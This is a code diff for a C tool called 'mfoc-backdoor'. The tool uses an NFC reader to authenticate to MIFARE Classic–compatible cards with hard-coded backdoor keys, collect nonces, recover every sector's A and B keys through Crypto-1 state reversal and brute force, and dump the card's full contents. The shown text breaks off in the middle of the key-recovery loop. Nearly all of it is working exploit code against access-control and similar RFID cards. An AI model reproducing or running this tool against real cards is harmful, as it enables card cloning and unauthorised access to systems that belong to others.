@@ -52,16 +52,17 @@
 #include "nfc-utils.h"
 #include "staticnested.h"
 
+#define MAX_SECTOR_CNT 40  // 4K 32x64b + 8*256b = 40
+#define MAX_BLOCK_CNT 256
+#define MAX_FRAME_LEN 264
 
-const nfc_modulation nm =
-{
-    .nmt = NMT_ISO14443A,
-    .nbr = NBR_106
-};
+#define MF_MODULATION \
+    (nfc_modulation) { .nmt = NMT_ISO14443A, .nbr = NBR_106 }
+#define SEC_TO_TRAILER(S) \
+    ((S) < 32 ? ((S) * 4 + 3) : ((S) * 16 - 369))
 
-nfc_context *ctx = NULL;
-nfc_device *pdi = NULL;
-nfc_target *pnt = NULL;
+#define KEY_BLK_SIZE 0x200
+
 
 const uint64_t def_test_keys[] =
 {
@@ -88,560 +89,10 @@ const uint64_t def_backdoor_keys[] =
     0x73B9836CF168  // Another 4K?
 };
 
+nfc_context *ctx = NULL;
+nfc_device *pdi = NULL;
+nfc_target *pnt = NULL;
 
-int main(
-    int argc,
-    char *const argv[])
-{
-    uint64_t *test_keys = NULL;
-    size_t test_keys_len = 0;
-
-    uint64_t *backdoor_keys = NULL;
-    size_t backdoor_keys_len = 0;
-
-    FILE *fp_out = NULL;
-
-    #define KEY_BLOCK 0x200
-    #define PUSH_KEY(VAL, ARR, LEN)                                                 \
-        do {                                                                        \
-            if (LEN % KEY_BLOCK == 0)                                               \
-            {                                                                       \
-                ARR = realloc(ARR, (LEN + KEY_BLOCK) * sizeof(uint64_t));           \
-                if (ARR == NULL)                                                    \
-                {                                                                   \
-                    fprintf(stderr, "Cannot allocate memory for " #ARR "\n");       \
-                    exit(EXIT_FAILURE);                                             \
-                }                                                                   \
-            }                                                                       \
-            ARR[LEN++] = VAL & 0xFFFFFFFFFFFF;                                      \
-        } while (0)
-
-    // Add default test keys
-    for (size_t i = 0; i < sizeof(def_test_keys) / sizeof(uint64_t); i++)
-        PUSH_KEY(def_test_keys[i], test_keys, test_keys_len);
-
-    // Add default backdoor keys
-    for (size_t i = 0; i < sizeof(def_backdoor_keys) / sizeof(uint64_t); i++)
-        PUSH_KEY(def_backdoor_keys[i], backdoor_keys, backdoor_keys_len);
-
-    for (;;)
-    {
-        int ch = getopt(argc, argv, "hf:g:o:");
-        if (ch == -1)
-            break;
-
-        switch (ch)
-        {
-            case 'f':
-            case 'g':
-                FILE *fp_in = fopen(optarg, "r");
-                if (fp_in == NULL)
-                {
-                    fprintf(stderr, "Cannot open keyfile: %s, exiting\n", optarg);
-                    exit(EXIT_FAILURE);
-                }
-
-                char line[64];
-                while (fgets(line, sizeof(line), fp_in) != NULL)
-                {
-                    uint64_t key = strtoull(line, NULL, 16);
-                    if (key != 0x00)
-                    {
-                        if (ch == 'f')
-                            PUSH_KEY(key, test_keys, test_keys_len);
-                        else
-                            PUSH_KEY(key, backdoor_keys, backdoor_keys_len);
-                    }
-                }
-
-                fclose(fp_in);
-                break;
-
-            case 'o':
-                fp_out = fopen(optarg, "wb");
-                if (fp_out == NULL)
-                {
-                    fprintf(stderr, "Cannot open output file %s, exiting\n", optarg);
-                    exit(EXIT_FAILURE);
-                }
-                break;
-
-            case 'h':
-            default:
-                fprintf(stdout, "Usage: mfoc-backdoor [-h] [-f file] [-g file] [-o output]\n");
-                fprintf(stdout, "  h     print this help and exit\n");
-                fprintf(stdout, "  f     parses a file of keys to test in addition to the default test keys\n");
-                fprintf(stdout, "  g     parses a file of keys to test in addition to the default backdoor keys\n");
-                fprintf(stdout, "  o     file in which the card contents will be written\n");
-                exit(EXIT_SUCCESS);
-        }
-    }
-
-    // Register cleanup
-    atexit(mf_destroy);
-
-    // Initialize reader/tag structures
-    mf_init();
-    mf_configure();
-
-    // Select tag
-    mf_select_target();
-
-    // Test if a compatible MIFARE tag is used
-    if ((pnt->nti.nai.btSak & 0x08) == 0 && pnt->nti.nai.btSak != 0x01)
-    {
-        fprintf(stderr, "Only Mifare Classic is supported\n");
-        exit(EXIT_FAILURE);
-    }
-
-    uint8_t num_sectors;
-    struct mf_sector sectors[NR_TRAILERS_4k] = {{ 0 }};
-
-    // Get Mifare Classic type from SAK
-    // see http://www.nxp.com/documents/application_note/AN10833.pdf Section 3.2
-    switch (pnt->nti.nai.btSak)
-    {
-        case 0x01:
-        case 0x08:
-        case 0x88:
-        case 0x28:
-        // case 0x19:   // Weird MFC 2k SAK
-            if (mf_rats_is_2k())
-            {
-                fprintf(stdout, "Found Mifare Plus 2k tag\n\n");
-                num_sectors = NR_TRAILERS_2k;
-            }
-            else
-            {
-                fprintf(stdout, "Found Mifare Classic 1k tag\n\n");
-                num_sectors = NR_TRAILERS_1k;
-            }
-            break;
-        case 0x09:
-            fprintf(stdout, "Found Mifare Classic Mini tag\n\n");
-            num_sectors = NR_TRAILERS_MINI;
-            break;
-        case 0x18:
-        // case 0x20:   // Weird ISO14443-4 SAK
-            fprintf(stdout, "Found Mifare Classic 4k tag\n\n");
-            num_sectors = NR_TRAILERS_4k;
-            break;
-        default:
-            fprintf(stderr, "Cannot determine card type from SAK\n");
-            exit(EXIT_FAILURE);
-    }
-
-    print_nfc_target(pnt, true);
-    fprintf(stdout, "\n\n");
-
-    // Save uid
-    const uint32_t auth_uid = bytes_to_num(pnt->nti.nai.abtUid + pnt->nti.nai.szUidLen - 4, 4);
-
-    // Test all keys provided
-    // todo - check for duplicates in found/unknown key list (do we care? will not be huge overhead)
-    // todo - make code more modular! :)
-    fprintf(stdout, "Try to authenticate to all sectors with %zu keys...\n", test_keys_len);
-    fprintf(stdout, "Symbols: '.' no key found, '/' A key found, '\\' B key found, 'X' both keys found\n\n");
-
-    uint8_t test_found_cnt = 0;
-
-    for (size_t i = 0; i < test_keys_len; i++)
-    {
-        fprintf(stdout, "\rKey: %012llX (%10zu / %zu) -> ", test_keys[i], i + 1, test_keys_len);
-
-        // Iterate over every sector
-        for (uint8_t s = 0; s < num_sectors; s++)
-        {
-            if (!sectors[s].found_key_a)
-            {
-                // Key A
-                if (mf_auth(MC_AUTH_A, sector_to_trailer(s), test_keys[i], auth_uid))
-                {
-                    sectors[s].found_key_a = true;
-                    sectors[s].key_a = test_keys[i];
-                    test_found_cnt++;
-
-                    if (!sectors[s].found_key_b)
-                    {
-                        uint8_t block[16];
-
-                        // Although KeyA can never be directly read from the data sector, KeyB can, so
-                        // if we need KeyB for this sector, it should be revealed by a data read with KeyA
-                        if (mf_read(sector_to_trailer(s), block))
-                        {
-                            uint64_t read_key = bytes_to_num(block + 10, 6);
-
-                            if (mf_auth(MC_AUTH_B, sector_to_trailer(s), read_key, auth_uid))
-                            {
-                                sectors[s].found_key_b = true;
-                                sectors[s].key_b = read_key;
-                                test_found_cnt++;
-                            }
-                        }
-                    }
-                }
-            }
-
-            if (!sectors[s].found_key_b)
-            {
-                // Key B
-                if (mf_auth(MC_AUTH_B, sector_to_trailer(s), test_keys[i], auth_uid))
-                {
-                    sectors[s].found_key_b = true;
-                    sectors[s].key_b = test_keys[i];
-                    test_found_cnt++;
-                }
-            }
-
-            if (sectors[s].found_key_a && sectors[s].found_key_b)
-                fprintf(stdout, "X");
-            else if (sectors[s].found_key_a)
-                fprintf(stdout, "/");
-            else if (sectors[s].found_key_b)
-                fprintf(stdout, "\\");
-            else
-                fprintf(stdout, ".");
-
-            fflush(stdout);
-        }
-
-        if (test_found_cnt == num_sectors * 2)
-            break;
-    }
-
-    fprintf(stdout, "\n\n");
-    free(test_keys);
-
-    if (test_found_cnt == num_sectors * 2)
-    {
-        fprintf(stdout, "We have all sectors encrypted with the test keys provided.\n\n");
-        goto dump_card;
-    }
-
-    // Test all backdoor keys
-    fprintf(stdout, "Try to authenticate with %zu backdoor keys...\n\n", backdoor_keys_len);
-
-    // Anticollision to send raw frames
-    mf_select_target();
-
-    uint64_t backdoor_key = ~0;
-
-    for (size_t i = 0; i < backdoor_keys_len; i++)
-    {
-        fprintf(stdout, "\rKey: %012llX (%10zu / %zu) -> ", backdoor_keys[i], i + 1, backdoor_keys_len);
-
-        // Advanced verification at sector 0
-        if (mf_nested_auth(MC_AUTH_A + 4, MC_AUTH_A, 0, backdoor_keys[i], auth_uid, NULL, NULL, false))
-        {
-            backdoor_key = backdoor_keys[i];
-            fprintf(stdout, "Success!");
-            break;
-        }
-        else
-            fprintf(stdout, "Failed..");
-
-        fflush(stdout);
-    }
-
-    fprintf(stdout, "\n\n");
-    free(backdoor_keys);
-
-    if (backdoor_key == ~0)
-    {
-        fprintf(stdout, "Card is not vulnerable to backdoor attack, or has no known key...\n\n");
-        goto dump_card;
-    }
-
-    // Check if the card has static nonces
-    for (uint32_t nt, nt_prev, i = 0; i < 4; i++)
-    {
-        if (!mf_nested_auth(MC_AUTH_A + 4, MC_AUTH_A, 0, backdoor_key, auth_uid, &nt, NULL, false))
-        {
-            fprintf(stderr, "Failed to authenticate the same sector using backdoor?\n");
-            exit(EXIT_FAILURE);
-        }
-
-        if (i > 0 && nt != nt_prev)
-        {
-            fprintf(stdout, "Card does not have static nested nonces... maybe try hardnested\n\n");
-            goto dump_card;
-        }
-
-        nt_prev = nt;
-    }
-
-    // Collect nonces and keystreams
-    fprintf(stdout, "Collecting key nonces using the backdoor command...\n\n");
-
-    for (uint8_t s = 0; s < num_sectors; s++)
-    {
-        if (sectors[s].found_key_a && sectors[s].found_key_b)
-            continue;
-
-        // Save nonces for both key A/B
-        if (!mf_nested_auth(
-                MC_AUTH_A + 4, MC_AUTH_A + 4, sector_to_trailer(s), backdoor_key,
-                auth_uid, &sectors[s].nt_a, &sectors[s].par_a, true) ||
-            !mf_nested_auth(
-                MC_AUTH_A + 4, MC_AUTH_A, sector_to_trailer(s), backdoor_key,
-                auth_uid, &sectors[s].nt_enc_a, &sectors[s].par_enc_a, false))
-        {
-            fprintf(stderr, "Failed to authenticate sector %02d, key A using backdoor command\n", s);
-            exit(EXIT_FAILURE);
-        }
-
-        if (!mf_nested_auth(
-                MC_AUTH_B + 4, MC_AUTH_B + 4, sector_to_trailer(s), backdoor_key,
-                auth_uid, &sectors[s].nt_b, &sectors[s].par_b, true) ||
-            !mf_nested_auth(
-                MC_AUTH_B + 4, MC_AUTH_B, sector_to_trailer(s), backdoor_key,
-                auth_uid, &sectors[s].nt_enc_b, &sectors[s].par_enc_b, false))
-        {
-            fprintf(stderr, "Failed to authenticate sector %02d, key B using backdoor command\n", s);
-            exit(EXIT_FAILURE);
-        }
-    }
-
-    // Initialize table for reversing LFSR states
-    init_lfsr16_table();
-
-    // LUT for comparing states
-    uint8_t *lfsr16_common = malloc(0x10000);
-    if (lfsr16_common == NULL)
-    {
-        fprintf(stderr, "Failed to allocate memory for lfsr16_common\n");
-        exit(EXIT_FAILURE);
-    }
-
-    // Now recover keys
-    fprintf(stdout, "Try to recover all unknown keys...\n\n");
-
-    for (uint8_t s = 0; s < num_sectors; s++)
-    {
-        if (sectors[s].found_key_a && sectors[s].found_key_b)
-            continue;
-
-        uint64_t *recovery_keys_a, *recovery_keys_b;
-        size_t recovery_keys_a_len, recovery_keys_b_len;
-
-        // Clear LUT
-        memset(lfsr16_common, 0, 0x10000);
-
-        if (!sectors[s].found_key_a)
-        {
-            // Generate candidates
-            if (!recover_keys(
-                    sectors[s].nt_a, sectors[s].nt_enc_a, sectors[s].par_a, sectors[s].par_enc_a,
-                    auth_uid, &recovery_keys_a, &recovery_keys_a_len))
-            {
-                fprintf(stderr, "Failed to allocate memory for recovery_keys_a\n");
-                exit(EXIT_FAILURE);
-            }
-
-            // Filter keys based on nonce generation in Fudan tags
-            for (size_t i = 0; i < recovery_keys_a_len; i++)
-            {
-                uint16_t seed = compute_seednt16_nt32(sectors[s].nt_a, recovery_keys_a[i]);
-                lfsr16_common[seed] |= 0b10;
-
-                // Store in top 16 bits
-                recovery_keys_a[i] |= (uint64_t) seed << 48;
-            }
-        }
-
-        if (!sectors[s].found_key_b)
-        {
-            if (!recover_keys(
-                    sectors[s].nt_b, sectors[s].nt_enc_b, sectors[s].par_b, sectors[s].par_enc_b,
-                    auth_uid, &recovery_keys_b, &recovery_keys_b_len))
-            {
-                fprintf(stderr, "Failed to allocate memory for recovery_keys_b\n");
-                exit(EXIT_FAILURE);
-            }
-
-            for (size_t i = 0; i < recovery_keys_b_len; i++)
-            {
-                uint16_t seed = compute_seednt16_nt32(sectors[s].nt_b, recovery_keys_b[i]);
-                lfsr16_common[seed] |= 0b01;
-
-                recovery_keys_b[i] |= (uint64_t) seed << 48;
-            }
-        }
-
-        if (!sectors[s].found_key_a)
-        {
-            for (size_t l = 0, i = 0; i < recovery_keys_a_len; i++)
-            {
-                uint64_t key = recovery_keys_a[i];
-                uint16_t seed = key >> 48;
-
-                if (sectors[s].found_key_b ?
-                    seed == compute_seednt16_nt32(sectors[s].nt_b, sectors[s].key_b) :
-                    lfsr16_common[seed] & 0b01)
-                {
-                    recovery_keys_a[i] = recovery_keys_a[l];
-                    recovery_keys_a[l++] = key;
-                }
-            }
-
-            // Bruteforce
-            for (size_t i = 0; i < recovery_keys_a_len; i++)
-            {
-                fprintf(stdout, "\rBruteforcing sector %02d, key A (%10zu / %zu) ", s, i + 1, recovery_keys_a_len);
-                fflush(stdout);
-
-                if (mf_auth(MC_AUTH_A, sector_to_trailer(s), recovery_keys_a[i], auth_uid))
-                {
-                    sectors[s].found_key_a = true;
-                    sectors[s].key_a = recovery_keys_a[i] & 0xFFFFFFFFFFFF;
-
-                    if (!sectors[s].found_key_b)
-                    {
-                        uint8_t block[16];
-
-                        // Try again to read key B
-                        if (mf_read(sector_to_trailer(s), block))
-                        {
-                            uint64_t read_key = bytes_to_num(block + 10, 6);
-
-                            if (mf_auth(MC_AUTH_B, sector_to_trailer(s), read_key, auth_uid))
-                            {
-                                sectors[s].found_key_b = true;
-                                sectors[s].key_b = read_key;
-                                break;
-                            }
-                        }
-                    }
-
-                    break;
-                }
-            }
-
-            fprintf(stdout, "-> Done\n");
-            free(recovery_keys_a);
-        }
-
-        if (!sectors[s].found_key_b)
-        {
-            for (size_t l = 0, i = 0; i < recovery_keys_b_len; i++)
-            {
-                uint64_t key = recovery_keys_b[i];
-                uint16_t seed = key >> 48;
-
-                if (sectors[s].found_key_a ?
-                    seed == compute_seednt16_nt32(sectors[s].nt_a, sectors[s].key_a) :
-                    lfsr16_common[seed] & 0b10)
-                {
-                    recovery_keys_b[i] = recovery_keys_b[l];
-                    recovery_keys_b[l++] = key;
-                }
-            }
-
-            for (size_t i = 0; i < recovery_keys_b_len; i++)
-            {
-                fprintf(stdout, "\rBruteforcing sector %02d, key B (%10zu / %zu) ", s, i + 1, recovery_keys_b_len);
-                fflush(stdout);
-
-                if (mf_auth(MC_AUTH_B, sector_to_trailer(s), recovery_keys_b[i], auth_uid))
-                {
-                    sectors[s].found_key_b = true;
-                    sectors[s].key_b = recovery_keys_b[i] & 0xFFFFFFFFFFFF;
-                    break;
-                }
-            }
-
-            fprintf(stdout, "-> Done\n");
-            free(recovery_keys_b);
-        }
-    }
-
-    fprintf(stdout, "\n");
-
-dump_card:
-    // Finally dump
-    for (uint8_t s = 0; s < num_sectors; s++)
-    {
-        fprintf(stdout, "Sector %02d - ", s);
-
-        if (sectors[s].found_key_a)
-            fprintf(stdout, "Found   Key A: %012llX ", sectors[s].key_a);
-        else
-            fprintf(stdout, "Unknown Key A               ");
-
-        if (sectors[s].found_key_b)
-            fprintf(stdout, "Found   Key B: %012llX ", sectors[s].key_b);
-        else
-            fprintf(stdout, "Unknown Key B               ");
-
-        fprintf(stdout, "\n");
-    }
-
-    fprintf(stdout, "\n");
-    fprintf(stdout, "Dumping all card contents... (Unknown = 0)\n\n");
-
-    for (uint8_t i = 0, s = 0; s < num_sectors; s++)
-    {
-        bool auth_success = false;
-
-        // Authenticate trailer block
-        if (sectors[s].found_key_a)
-        {
-            if (mf_auth(MC_AUTH_A, sector_to_trailer(s), sectors[s].key_a, auth_uid))
-                auth_success = true;
-            else
-            {
-                fprintf(stderr, "Failed to authenticate sector %02d with a known A key?\n", s);
-                exit(EXIT_FAILURE);
-            }
-        }
-        else if (sectors[s].found_key_b)
-        {
-            if (mf_auth(MC_AUTH_B, sector_to_trailer(s), sectors[s].key_b, auth_uid))
-                auth_success = true;
-            else
-            {
-                fprintf(stderr, "Failed to authenticate sector %02d with a known B key?\n", s);
-                exit(EXIT_FAILURE);
-            }
-        }
-
-        // Now read all blocks in sector
-        for (; i <= sector_to_trailer(s); i++)
-        {
-            uint8_t block[16] = { 0 };
-
-            if (auth_success)
-                mf_read(i, block);
-
-            // Copy keys into trailer blocks
-            if (i == sector_to_trailer(s))
-            {
-                num_to_bytes(block, sectors[s].key_a, 6);
-                num_to_bytes(block + 10, sectors[s].key_b, 6);
-            }
-
-            fprintf(stdout, "Block %03d: ", i);
-            for (size_t u = 0; u < sizeof(block); u++)
-                fprintf(stdout, "%02X ", block[u]);
-            fprintf(stdout, "\n");
-
-            if (fp_out != NULL)
-            {
-                size_t res = fwrite(block, 1, sizeof(block), fp_out);
-                if (res != sizeof(block))
-                {
-                    fprintf(stderr, "Error, cannot write block %03d to dump\n", i);
-                    exit(EXIT_FAILURE);
-                }
-            }
-        }
-    }
-
-    if (fp_out != NULL)
-        fclose(fp_out);
-
-    exit(EXIT_SUCCESS);
-}
 
 void num_to_bytes(
     uint8_t *dest,
@@ -668,12 +119,6 @@ uint64_t bytes_to_num(
     }
 
     return num;
-}
-
-uint8_t sector_to_trailer(
-    uint8_t sector)
-{
-    return sector < 32 ? (sector * 4 + 3) : (sector * 16 + 143);
 }
 
 void mf_init(void)
@@ -705,10 +150,8 @@ void mf_destroy(void)
 {
     // Reap and exit
     free(pnt);
-    if (pdi != NULL)
-        nfc_close(pdi);
-    if (ctx != NULL)
-        nfc_exit(ctx);
+    nfc_close(pdi);
+    nfc_exit(ctx);
 }
 
 void mf_configure(void)
@@ -740,7 +183,7 @@ void mf_configure(void)
 
 void mf_select_target(void)
 {
-    int tag_cnt = nfc_initiator_select_passive_target(pdi, nm, NULL, 0, pnt);
+    int tag_cnt = nfc_initiator_select_passive_target(pdi, MF_MODULATION, NULL, 0, pnt);
     if (tag_cnt == 0)
     {
         fprintf(stderr, "No tag found.\n");
@@ -762,43 +205,6 @@ void mf_device_set(
         nfc_perror(pdi, "nfc_device_set_property_bool");
         exit(EXIT_FAILURE);
     }
-}
-
-bool mf_rats_is_2k(void)
-{
-    uint8_t abt_cmd[] = { 0xE0, 0x50 };
-    uint8_t abt_res[MAX_FRAME_LEN];
-
-    // Use raw send/receive methods
-    mf_device_set(NP_EASY_FRAMING, false);
-
-    int res = nfc_initiator_transceive_bytes(pdi, abt_cmd, sizeof(abt_cmd), abt_res, sizeof(abt_res), 0);
-    if (res > 0)
-    {
-        // ISO14443-4 card, turn RF field off/on to access ISO14443-3 again
-        mf_device_set(NP_ACTIVATE_FIELD, false);
-        mf_device_set(NP_ACTIVATE_FIELD, true);
-    }
-
-    mf_device_set(NP_EASY_FRAMING, true);
-
-    // Reselect tag
-    mf_select_target();
-
-    if (res >= 10)
-    {
-        fprintf(stdout, "ATS %02X%02X%02X%02X%02X|%02X%02X%02X%02X%02X\n",
-                   res, abt_res[0], abt_res[1], abt_res[2], abt_res[3],
-            abt_res[4], abt_res[5], abt_res[6], abt_res[7], abt_res[8]);
-
-        return abt_res[5] == 0xC1
-            && abt_res[6] == 0x05
-            && abt_res[7] == 0x2F
-            && abt_res[8] == 0x2F
-            && (pnt->nti.nai.abtAtqa[1] & 0x02) == 0x00;
-    }
-
-    return false;
 }
 
 bool mf_read(
@@ -999,4 +405,468 @@ bool mf_nested_auth(
     mf_select_target();
 
     return true;
+}
+
+int main(
+    int argc,
+    char *const argv[])
+{
+    uint64_t *test_keys = NULL;
+    size_t test_keys_len = 0;
+
+    uint64_t *backdoor_keys = NULL;
+    size_t backdoor_keys_len = 0;
+
+    FILE *fp_out = NULL;
+
+    #define PUSH_KEY(VAL, ARR, LEN)                                             \
+        do {                                                                    \
+            if (LEN % KEY_BLK_SIZE == 0)                                        \
+            {                                                                   \
+                ARR = realloc(ARR, (LEN + KEY_BLK_SIZE) * sizeof(uint64_t));    \
+                if (ARR == NULL)                                                \
+                {                                                               \
+                    fprintf(stderr, "Cannot allocate memory for " #ARR "\n");   \
+                    exit(EXIT_FAILURE);                                         \
+                }                                                               \
+            }                                                                   \
+            ARR[LEN++] = VAL & 0xFFFFFFFFFFFF;                                  \
+        } while (0)
+
+    // Add default test keys
+    for (size_t i = 0; i < sizeof(def_test_keys) / sizeof(uint64_t); i++)
+        PUSH_KEY(def_test_keys[i], test_keys, test_keys_len);
+
+    // Add default backdoor keys
+    for (size_t i = 0; i < sizeof(def_backdoor_keys) / sizeof(uint64_t); i++)
+        PUSH_KEY(def_backdoor_keys[i], backdoor_keys, backdoor_keys_len);
+
+    for (;;)
+    {
+        int ch = getopt(argc, argv, "hf:g:o:");
+        if (ch == -1)
+            break;
+
+        switch (ch)
+        {
+            case 'f':
+            case 'g':
+                FILE *fp_in = fopen(optarg, "r");
+                if (fp_in == NULL)
+                {
+                    fprintf(stderr, "Cannot open keyfile: %s, exiting\n", optarg);
+                    exit(EXIT_FAILURE);
+                }
+
+                char line[64];
+                while (fgets(line, sizeof(line), fp_in) != NULL)
+                {
+                    uint64_t key = strtoull(line, NULL, 16);
+                    if (key != 0x00)
+                    {
+                        if (ch == 'f')
+                            PUSH_KEY(key, test_keys, test_keys_len);
+                        else
+                            PUSH_KEY(key, backdoor_keys, backdoor_keys_len);
+                    }
+                }
+
+                fclose(fp_in);
+                break;
+
+            case 'o':
+                fp_out = fopen(optarg, "wb");
+                if (fp_out == NULL)
+                {
+                    fprintf(stderr, "Cannot open output file %s, exiting\n", optarg);
+                    exit(EXIT_FAILURE);
+                }
+                break;
+
+            case 'h':
+            default:
+                printf("Usage: mfoc-backdoor [-h] [-f file] [-g file] [-o output]\n");
+                printf("  h     print this help and exit\n");
+                printf("  f     parses a file of keys to test in addition to the default test keys\n");
+                printf("  g     parses a file of keys to test in addition to the default backdoor keys\n");
+                printf("  o     file in which the card contents will be written\n");
+                exit(EXIT_SUCCESS);
+        }
+    }
+
+    // Register cleanup
+    atexit(mf_destroy);
+
+    // Initialize reader/tag structures
+    mf_init();
+    mf_configure();
+
+    // Select tag
+    mf_select_target();
+
+    // Test if a compatible MIFARE tag is used
+    if ((pnt->nti.nai.btSak & 0x08) == 0 && pnt->nti.nai.btSak != 0x01)
+    {
+        fprintf(stderr, "Only Mifare Classic is supported\n");
+        exit(EXIT_FAILURE);
+    }
+
+    print_nfc_target(pnt, true);
+    printf("\n\n");
+
+    // Save uid
+    uint32_t auth_uid = bytes_to_num(pnt->nti.nai.abtUid + pnt->nti.nai.szUidLen - 4, 4);
+
+    uint64_t backdoor_key = ~0;
+
+    // Test all backdoor keys
+    for (size_t i = 0; i < backdoor_keys_len; i++)
+    {
+        printf("\rTry to authenticate card with backdoor keys... (%10zu / %zu)  ", i + 1, backdoor_keys_len);
+        fflush(stdout);
+
+        // Advanced verification at sector 0
+        if (mf_nested_auth(MC_AUTH_A + 4, MC_AUTH_A, 0, backdoor_keys[i], auth_uid, NULL, NULL, false))
+        {
+            backdoor_key = backdoor_keys[i];
+            break;
+        }
+    }
+
+    printf("\n\n");
+    free(backdoor_keys);
+
+    if (backdoor_key != ~0)
+        printf("Found backdoor key: %012llX\n\n", backdoor_key);
+    else
+    {
+        printf("Card does not have a known backdoor... try mfoc (hardnested)\n");
+        exit(EXIT_SUCCESS);
+    }
+
+    // Check if the card has static nonces
+    // At this point it is established the card supports CRYPTO1 / backdoor command
+    for (uint32_t nt, nt_prev, i = 0; i < 4; i++)
+    {
+        mf_nested_auth(MC_AUTH_A + 4, MC_AUTH_A, 0, backdoor_key, auth_uid, &nt, NULL, false);
+
+        if (i > 0 && nt != nt_prev)
+        {
+            printf("Card does not have static nested nonces... try mfoc (hardnested)\n");
+            exit(EXIT_SUCCESS);
+        }
+
+        nt_prev = nt;
+    }
+
+    size_t num_sectors, num_blocks;
+    struct mf_key keys_a[MAX_SECTOR_CNT] = { 0 },
+                  keys_b[MAX_SECTOR_CNT] = { 0 };
+
+    // Save nonces for both key A/B
+    // Probe all sectors to choose num_sectors
+    for (uint8_t s = 0; s < MAX_SECTOR_CNT; s++)
+    {
+        printf("\rCollecting card nonces using the backdoor command... (sector %02d)  ", s);
+        fflush(stdout);
+
+        if (!mf_nested_auth(MC_AUTH_A + 4, MC_AUTH_A + 4, SEC_TO_TRAILER(s), backdoor_key,
+                            auth_uid, &keys_a[s].nt, &keys_a[s].par, true) ||
+            !mf_nested_auth(MC_AUTH_A + 4, MC_AUTH_A, SEC_TO_TRAILER(s), backdoor_key,
+                            auth_uid, &keys_a[s].nt_enc, &keys_a[s].par_enc, false) ||
+            !mf_nested_auth(MC_AUTH_B + 4, MC_AUTH_B + 4, SEC_TO_TRAILER(s), backdoor_key,
+                            auth_uid, &keys_b[s].nt, &keys_b[s].par, true) ||
+            !mf_nested_auth(MC_AUTH_B + 4, MC_AUTH_B, SEC_TO_TRAILER(s), backdoor_key,
+                            auth_uid, &keys_b[s].nt_enc, &keys_b[s].par_enc, false))
+        {
+            num_sectors = s;
+            num_blocks = SEC_TO_TRAILER(s - 1) + 1;
+            break;
+        }
+    }
+
+    printf("\n\n");
+
+    printf("Sector | Nt A     | Nt B     |\n");
+    printf("-------+----------+----------+\n");
+    for (uint8_t s = 0; s < num_sectors; s++)
+        printf("%02d     | %08llX | %08llX |\n", s, keys_a[s].nt, keys_b[s].nt);
+    printf("\n");
+
+    // Test all keys provided
+    // todo - check for duplicates in found/unknown key list (do we care? will not be huge overhead)
+    // todo - make code more modular! :)
+    for (size_t i = 0; i < test_keys_len; i++)
+    {
+        printf("\rTry to authenticate to all sectors with test keys... (%10zu / %zu)  ", i + 1, test_keys_len);
+        fflush(stdout);
+
+        // Iterate over every sector
+        for (uint8_t s = 0; s < num_sectors; s++)
+        {
+            // Filter keys based on collected keystream
+            if (!keys_a[s].found &&
+                sen_check_key(keys_a[s].nt, keys_a[s].nt_enc, keys_a[s].par, keys_a[s].par_enc,
+                              auth_uid, test_keys[i]))
+            {
+                if (mf_auth(MC_AUTH_A, SEC_TO_TRAILER(s), test_keys[i], auth_uid))
+                {
+                    keys_a[s].found = true;
+                    keys_a[s].key = test_keys[i];
+
+                    if (!keys_b[s].found)
+                    {
+                        uint8_t block[16];
+
+                        // Although KeyA can never be directly read from the data sector, KeyB can, so
+                        // if we need KeyB for this sector, it should be revealed by a data read with KeyA
+                        if (mf_read(SEC_TO_TRAILER(s), block))
+                        {
+                            uint64_t read_key = bytes_to_num(block + 10, 6);
+
+                            if (mf_auth(MC_AUTH_B, SEC_TO_TRAILER(s), read_key, auth_uid))
+                            {
+                                keys_b[s].found = true;
+                                keys_b[s].key = read_key;
+                            }
+                        }
+                    }
+                }
+            }
+
+            if (!keys_b[s].found &&
+                sen_check_key(keys_b[s].nt, keys_b[s].nt_enc, keys_b[s].par, keys_b[s].par_enc,
+                              auth_uid, test_keys[i]))
+            {
+                if (mf_auth(MC_AUTH_B, SEC_TO_TRAILER(s), test_keys[i], auth_uid))
+                {
+                    keys_b[s].found = true;
+                    keys_b[s].key = test_keys[i];
+                }
+            }
+        }
+    }
+
+    printf("\n\n");
+    free(test_keys);
+
+    printf("Sector | Key A        | Key B        |\n");
+    printf("-------+--------------+--------------+\n");
+    for (uint8_t s = 0; s < num_sectors; s++)
+    {
+        printf("%02d     | ", s);
+        printf(keys_a[s].found ? "%012llX | " : "             | ", keys_a[s].key);
+        printf(keys_b[s].found ? "%012llX | " : "             | ", keys_b[s].key);
+        printf("\n");
+    }
+    printf("\n");
+
+    // Now recover keys
+    printf("Try to recover all unknown keys...\n\n");
+
+    // Initialize table for reversing LFSR states
+    init_lfsr16_table();
+
+    // LUT for comparing states
+    uint8_t lfsr16_common[0x10000];
+
+    for (uint8_t s = 0; s < num_sectors; s++)
+    {
+        if (keys_a[s].found && keys_b[s].found)
+            continue;
+
+        uint64_t *candidates_a, *candidates_b;
+        size_t candidates_a_len, candidates_b_len;
+
+        // Clear LUT
+        memset(lfsr16_common, 0, sizeof(lfsr16_common));
+
+        if (!keys_a[s].found)
+        {
+            // Generate candidates
+            if (!sen_recover_keys(keys_a[s].nt, keys_a[s].nt_enc, keys_a[s].par, keys_a[s].par_enc,
+                                  auth_uid, &candidates_a, &candidates_a_len))
+            {
+                fprintf(stderr, "Failed to allocate memory for candidates_a\n");
+                exit(EXIT_FAILURE);
+            }
+
+            // Filter keys based on nonce generation in Fudan tags
+            for (size_t i = 0; i < candidates_a_len; i++)
+            {
+                uint16_t seed = compute_seednt16_nt32(keys_a[s].nt, candidates_a[i]);
+                lfsr16_common[seed] |= 0b10;
+
+                // Store in top 16 bits
+                candidates_a[i] |= (uint64_t) seed << 48;
+            }
+        }
+
+        if (!keys_b[s].found)
+        {
+            if (!sen_recover_keys(keys_b[s].nt, keys_b[s].nt_enc, keys_b[s].par, keys_b[s].par_enc,
+                                  auth_uid, &candidates_b, &candidates_b_len))
+            {
+                fprintf(stderr, "Failed to allocate memory for candidates_b\n");
+                exit(EXIT_FAILURE);
+            }
+
+            for (size_t i = 0; i < candidates_b_len; i++)
+            {
+                uint16_t seed = compute_seednt16_nt32(keys_b[s].nt, candidates_b[i]);
+                lfsr16_common[seed] |= 0b01;
+
+                candidates_b[i] |= (uint64_t) seed << 48;
+            }
+        }
+
+        if (!keys_a[s].found)
+        {
+            for (size_t l = 0, i = 0; i < candidates_a_len; i++)
+            {
+                uint64_t key = candidates_a[i];
+                uint16_t seed = key >> 48;
+
+                if (keys_b[s].found ?
+                    seed == compute_seednt16_nt32(keys_b[s].nt, keys_b[s].key) :
+                    lfsr16_common[seed] & 0b01)
+                {
